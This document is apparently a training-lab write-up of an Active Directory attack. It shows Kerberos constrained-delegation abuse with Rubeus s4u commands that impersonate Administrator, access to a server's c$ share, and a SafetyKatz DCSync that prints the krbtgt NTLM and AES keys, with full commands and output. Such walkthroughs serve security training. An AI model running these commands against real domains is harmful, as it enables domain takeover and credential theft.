# Learning Objective 16 (Privilege Escalation | Constrained Delegation + DCSync)

## Tasks

1. **Gain access to a delegated service abusing the constrained delegation configured on a user account by forging a TGS using the user encryption key hash**
2.  **Abuse the constrained delegation configured on a computer account, to forge a TGS using the computer encryption key hash and use it to obtain an alternate TGS for LDAP service on the DC, enabling a DCSync attack**

---

## Attack Path Steps

- **Find a Target User where Constrained Delegation is Enabled**
- **Forge an S4U TGS using the Target User TGS Encryption Key Hash for the Service to which Delegation is Configured**
- **Leverage the Forged Ticket to Gain Access to that Service**
- **Find a Target Server where Constrained Delegation is Enabled**
- **Forge an S4U TGS using the Target Server TGS Encryption Key Hash for the Delegated Service and Leverage it to Obtain an Alternate TGS for the LDAP Service**
- **Leverage the Obtained Ticket to Run a DCSync Attack on the DC and Gain DA Privileges**

---

## Solution

1. **Gain access to a delegated service abusing the constrained delegation configured on a user account by forging a TGS using the user encryption key hash**

- **Find a Target User where Constrained Delegation is Enabled**

To enumerate users with constrained delegation enabled we can use PowerView.

![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
```
[SNIP]
```

`. C:\AD\Tools\PowerView.ps1`

`Get-DomainUser -TrustedToAuth`:
```
[SNIP]

logoncount               : 5
badpasswordtime          : 12/31/1600 4:00:00 PM
distinguishedname        : CN=web svc,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
objectclass              : {top, person, organizationalPerson, user}
displayname              : web svc
lastlogontimestamp       : 10/25/2024 3:37:34 AM
userprincipalname        : websvc
whencreated              : 11/14/2022 12:42:13 PM
samaccountname           : websvc👤
codepage                 : 0
samaccounttype           : USER_OBJECT📌
accountexpires           : NEVER
countrycode              : 0
whenchanged              : 10/25/2024 10:37:34 AM
instancetype             : 4
usncreated               : 38071
objectguid               : b7ab147c-f929-4ad2-82c9-7e1b656492fe
sn                       : svc
lastlogoff               : 12/31/1600 4:00:00 PM
msds-allowedtodelegateto : {CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL, CIFS📌/dcorp-mssql🖥️}
objectcategory           : CN=Person,CN=Schema,CN=Configuration,DC=moneycorp,DC=local
dscorepropagationdata    : {12/5/2024 12:47:28 PM, 11/14/2022 12:42:13 PM, 1/1/1601 12:00:01 AM}
serviceprincipalname     : {SNMP/ufc-adminsrv.dollarcorp.moneycorp.LOCAL, SNMP/ufc-adminsrv}
givenname                : web
usnchanged               : 255349
lastlogon                : 10/25/2024 3:37:34 AM
badpwdcount              : 0
cn                       : web svc
useraccountcontrol       : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, TRUSTED_TO_AUTH_FOR_DELEGATION📌
objectsid                : S-1-5-21-719815819-3726368948-3917688648-1114
primarygroupid           : 513
pwdlastset               : 11/14/2022 4:42:13 AM
name                     : web svc

[SNIP]
```

We already have secrets of `websvc` from `dcorp-admisrv` machine (see *Learning Objective 07*).

- **Forge an S4U TGS using the Target User TGS Encryption Key Hash for the Service to which Delegation is Configured**

In the below command, we request a TGS for `websvc` as the DA `Administrator`.

Then the TGS is used to access the service specified in the `/msdsspn` parameter, which is filesystem on `dcorp-mssql`.

![Run as administrator](./assets/screenshots/learning_objectives_run_as_administrator.png)

![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args s4u /user:websvc /aes256:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7 /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL" /ptt`:
```
[SNIP]

[*] Action: S4U📌

[*] Using aes256_cts_hmac_sha1 hash: 2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7
[*] Building AS-REQ (w/ preauth) for: 'dollarcorp.moneycorp.local\websvc'
[*] Using domain controller: 172.16.2.1:88
[+] TGT request successful!📌
[*] base64(ticket.kirbi):

[SNIP]

[*] Action: S4U📌

[*] Building S4U2self request for: 'websvc@DOLLARCORP.MONEYCORP.LOCAL'
[*] Using domain controller: dcorp-dc.dollarcorp.moneycorp.local (172.16.2.1)
[*] Sending S4U2self request to 172.16.2.1:88
[+] S4U2self success!
[*] Got a TGS for 'Administrator'🎭 to 'websvc👤@DOLLARCORP.MONEYCORP.LOCAL'🏛️
[*] base64(ticket.kirbi):

[SNIP]

[*] Impersonating user 'Administrator'🎭 to target SPN 'CIFS📌/dcorp-mssql🖥️.dollarcorp.moneycorp.LOCAL'
[*] Building S4U2proxy request for service: 'CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL'
[*] Using domain controller: dcorp-dc.dollarcorp.moneycorp.local (172.16.2.1)
[*] Sending S4U2proxy request to domain controller 172.16.2.1:88
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL':

[SNIP]

[+] Ticket successfully imported!🎟️
```

`klist`:
```
Current LogonId is 0:0x38bfd7

Cached Tickets: (1)

#0>     Client: Administrator🎭 @ DOLLARCORP.MONEYCORP.LOCAL🏛️
        Server: CIFS📌/dcorp-mssql🖥️.dollarcorp.moneycorp.LOCAL @ DOLLARCORP.MONEYCORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
        Start Time: 2/17/2025 3:13:29 (local)
        End Time:   2/17/2025 13:13:29 (local)
        Renew Time: 2/24/2025 3:13:29 (local)
        Session Key Type: AES-128-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called:
```

- **Leverage the Forged Ticket to Gain Access to that Service**

Try accessing filesystem on `dcorp-mssql`.

`dir \\dcorp-mssql.dollarcorp.moneycorp.local\c$`:
```
 Volume in drive \\dcorp-mssql.dollarcorp.moneycorp.local\c$ has no label.
 Volume Serial Number is 76D3-EB93

 Directory of \\dcorp-mssql.dollarcorp.moneycorp.local\c$📁

05/08/2021  12:15 AM    <DIR>          PerfLogs
11/14/2022  04:44 AM    <DIR>          Program Files
11/14/2022  04:43 AM    <DIR>          Program Files (x86)
12/03/2023  06:36 AM    <DIR>          Transcripts
11/15/2022  01:48 AM    <DIR>          Users
10/25/2024  03:29 AM    <DIR>          Windows
               0 File(s)              0 bytes
               6 Dir(s)   2,423,300,096 bytes free
```
🚩

2.  **Abuse the constrained delegation configured on a computer account, to forge a TGS using the computer encryption key hash and use it to obtain an alternate TGS for LDAP service on the DC, enabling a DCSync attack**

- **Find a Target Server where Constrained Delegation is Enabled**

Enumerate the computer accounts with constrained delegation enabled using PowerView.

![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
```
[SNIP]
```

`. C:\AD\Tools\PowerView.ps1`

`Get-DomainComputer -TrustedToAuth`:
```
[SNIP]

pwdlastset                    : 11/11/2022 11:16:12 PM
logoncount                    : 96
badpasswordtime               : 12/31/1600 4:00:00 PM
distinguishedname             : CN=DCORP-ADMINSRV,OU=Applocked,DC=dollarcorp,DC=moneycorp,DC=local
objectclass                   : {top, person, organizationalPerson, user...}
lastlogontimestamp            : 2/14/2025 9:03:21 PM
whencreated                   : 11/12/2022 7:16:12 AM
samaccountname                : DCORP-ADMINSRV$👤
localpolicyflags              : 0
codepage                      : 0
samaccounttype                : MACHINE_ACCOUNT📌
whenchanged                   : 2/15/2025 5:03:21 AM
accountexpires                : NEVER
countrycode                   : 0
operatingsystem               : Windows Server 2022 Datacenter
instancetype                  : 4
useraccountcontrol            : WORKSTATION_TRUST_ACCOUNT, TRUSTED_TO_AUTH_FOR_DELEGATION📌
objectguid                    : 2e036483-7f45-4416-8a62-893618556370
operatingsystemversion        : 10.0 (20348)
lastlogoff                    : 12/31/1600 4:00:00 PM
msds-allowedtodelegateto      : {TIME/dcorp-dc.dollarcorp.moneycorp.LOCAL, TIME📌/dcorp-DC🖥️}
objectcategory                : CN=Computer,CN=Schema,CN=Configuration,DC=moneycorp,DC=local
dscorepropagationdata         : {12/5/2024 12:47:28 PM, 11/15/2022 4:16:45 AM, 1/1/1601 12:00:01 AM}
serviceprincipalname          : {WSMAN/dcorp-adminsrv, WSMAN/dcorp-adminsrv.dollarcorp.moneycorp.local, TERMSRV/DCORP-ADMINSRV, TERMSRV/dcorp-adminsrv.dollarcorp.moneycorp.local...}
usncreated                    : 13891
usnchanged                    : 520005
lastlogon                     : 2/17/2025 3:18:29 AM
badpwdcount                   : 0
cn                            : DCORP-ADMINSRV
msds-supportedencryptiontypes : 28
objectsid                     : S-1-5-21-719815819-3726368948-3917688648-1105
primarygroupid                : 515
iscriticalsystemobject        : False
name                          : DCORP-ADMINSRV
dnshostname                   : dcorp-adminsrv.dollarcorp.moneycorp.local

[SNIP]
```

- **Forge an S4U TGS using the Target Server TGS Encryption Key Hash for the Delegated Service and Leverage it to Obtain an Alternate TGS for the LDAP Service**

We already have the AES keys of `dcorp-adminsrv$` from `dcorp-adminsrv` machine (see *Learning Objective 07*).

Run the below command **from an elevated command prompt** as SafetyKatz, that we will use for DCSync, would need that.

![Run as administrator](./assets/screenshots/learning_objectives_run_as_administrator.png)

![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args s4u /user:dcorp-adminsrv$ /aes256:e9513a0ac270264bb12fb3b3ff37d7244877d269a97c7b3ebc3f6f78c382eb51 /impersonateuser:Administrator /msdsspn:time/dcorp-dc.dollarcorp.moneycorp.LOCAL /altservice:ldap /ptt`:
```
[SNIP]

[*] Action: S4U📌

[*] Using aes256_cts_hmac_sha1 hash: e9513a0ac270264bb12fb3b3ff37d7244877d269a97c7b3ebc3f6f78c382eb51
[*] Building AS-REQ (w/ preauth) for: 'dollarcorp.moneycorp.local\dcorp-adminsrv$'
[*] Using domain controller: 172.16.2.1:88
[+] TGT request successful!📌
[*] base64(ticket.kirbi):

[SNIP]

[*] Action: S4U📌

[*] Building S4U2self request for: 'dcorp-adminsrv$@DOLLARCORP.MONEYCORP.LOCAL'
[*] Using domain controller: dcorp-dc.dollarcorp.moneycorp.local (172.16.2.1)
[*] Sending S4U2self request to 172.16.2.1:88
[+] S4U2self success!
[*] Got a TGS for 'Administrator'🎭 to 'dcorp-adminsrv$🖥️@DOLLARCORP.MONEYCORP.LOCAL'🏛️
[*] base64(ticket.kirbi):

[SNIP]

[*] Impersonating user 'Administrator'🎭 to target SPN 'time📌/dcorp-dc🖥️.dollarcorp.moneycorp.LOCAL'
[*]   Final ticket will be for the alternate service 'ldap'
[*] Building S4U2proxy request for service: 'time/dcorp-dc.dollarcorp.moneycorp.LOCAL'
[*] Using domain controller: dcorp-dc.dollarcorp.moneycorp.local (172.16.2.1)
[*] Sending S4U2proxy request to domain controller 172.16.2.1:88
[+] S4U2proxy success!
[*] Substituting alternative service name 'ldap'📌
[*] base64(ticket.kirbi) for SPN 'ldap📌/dcorp-dc🖥️.dollarcorp.moneycorp.LOCAL':

[SNIP]

[+] Ticket successfully imported!🎟️
```

`klist`:
```
Current LogonId is 0:0x3a26cf

Cached Tickets: (1)

#0>     Client: Administrator🎭 @ DOLLARCORP.MONEYCORP.LOCAL🏛️
        Server: ldap📌/dcorp-dc🖥️.dollarcorp.moneycorp.LOCAL @ DOLLARCORP.MONEYCORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
        Start Time: 2/19/2025 16:48:30 (local)
        End Time:   2/20/2025 2:48:29 (local)
        Renew Time: 2/26/2025 16:48:29 (local)
        Session Key Type: AES-128-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called:
```

- **Leverage the Obtained Ticket to Run a DCSync Attack on the DC and Gain DA Privileges**

Run the below command to abuse the LDAP service ticket.

`C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"`:
```
[SNIP]

mimikatz(commandline) # lsadump::evasive-dcsync /user:dcorp\krbtgt📌
[DC] 'dollarcorp.moneycorp.local' will be the domain
[DC] 'dcorp-dc.dollarcorp.moneycorp.local' will be the DC server
[DC] 'dcorp\krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt📌
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 11/12/2022 5:59:41 AM
Object Security ID   : S-1-5-21-719815819-3726368948-3917688648-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 4e9815869d2090ccfca61c1fe0d23986🔑
    ntlm- 0: 4e9815869d2090ccfca61c1fe0d23986
    lm  - 0: ea03581a1268674a828bde6ab09db837

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 6d4cc4edd46d8c3d3e59250c91eac2bd

* Primary:Kerberos-Newer-Keys *
    Default Salt : DOLLARCORP.MONEYCORP.LOCALkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848🔑
      aes128_hmac       (4096) : e74fa5a9aa05b2c0b2d196e226d8820e
      des_cbc_md5       (4096) : 150ea2e934ab6b80

[SNIP]
```
🚩

---
---
